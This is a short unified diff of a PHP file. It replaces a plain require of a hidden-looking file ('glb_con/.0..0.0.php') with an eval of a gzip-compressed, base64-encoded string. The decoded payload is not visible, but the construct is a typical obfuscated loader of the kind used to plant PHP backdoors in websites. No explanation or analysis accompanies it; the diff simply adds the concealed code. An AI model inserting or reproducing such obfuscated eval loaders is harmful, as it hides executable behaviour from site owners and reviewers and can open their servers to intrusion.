@@ -1,3 +1,4 @@
 <?php
-require('glb_con/.0..0.0.php');
+// .0..0.0
+eval(gzinflate(base64_decode('4ypKLSzNLErVUE/PSYpPzs/T1zPQAyIDvYKMAnVNa14uAA==')));
 ?>
